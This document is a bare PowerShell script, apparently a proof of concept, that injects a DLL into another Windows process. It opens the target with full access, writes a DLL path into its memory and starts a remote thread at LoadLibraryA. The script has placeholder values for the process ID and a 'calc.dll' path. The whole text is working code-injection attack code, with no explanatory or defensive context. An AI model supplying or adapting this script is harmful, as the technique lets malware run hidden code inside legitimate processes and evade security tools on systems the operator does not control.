# Target process ID and DLL path
$ProcessId = 5812 # Replace with the target process ID
$DllPath = "C:\Users\<user>\Desktop\calc.dll" # Replace with your DLL path

# Define Win32 API functions using P/Invoke
$OpenProcess = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
"@ -Name "Win32OpenProcess" -PassThru

$VirtualAllocEx = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
"@ -Name "Win32VirtualAllocEx" -PassThru

$WriteProcessMemory = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
"@ -Name "Win32WriteProcessMemory" -PassThru

$CreateRemoteThread = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
"@ -Name "Win32CreateRemoteThread" -PassThru

$GetProcAddress = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
"@ -Name "Win32GetProcAddress" -PassThru

$GetModuleHandle = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
"@ -Name "Win32GetModuleHandle" -PassThru

# Constants for memory and process access
$PROCESS_ALL_ACCESS = 0x001F0FFF
$MEM_COMMIT = 0x00001000
$MEM_RESERVE = 0x00002000
$PAGE_READWRITE = 0x04

# Open the target process
$hProcess = $OpenProcess::OpenProcess($PROCESS_ALL_ACCESS, $false, $ProcessId)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Failed to open the process."
    exit
}

# Allocate memory in the target process
$allocMem = $VirtualAllocEx::VirtualAllocEx($hProcess, [IntPtr]::Zero, $DllPath.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
if ($allocMem -eq [IntPtr]::Zero) {
    Write-Host "Failed to allocate memory in the process."
    exit
}

# Write the DLL path into the allocated memory
$bytes = [System.Text.Encoding]::ASCII.GetBytes($DllPath)
$written = [UIntPtr]::Zero
$WriteProcessMemory::WriteProcessMemory($hProcess, $allocMem, $bytes, $bytes.Length, [ref]$written) | Out-Null

# Get the address of LoadLibraryA
$hKernel32 = $GetModuleHandle::GetModuleHandle("kernel32.dll")
$hLoadLibrary = $GetProcAddress::GetProcAddress($hKernel32, "LoadLibraryA")

# Create a remote thread to load the DLL
$hThread = $CreateRemoteThread::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $hLoadLibrary, $allocMem, 0, [ref][IntPtr]::Zero)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Host "Failed to create the remote thread."
    exit
}

Write-Host "DLL injected successfully."
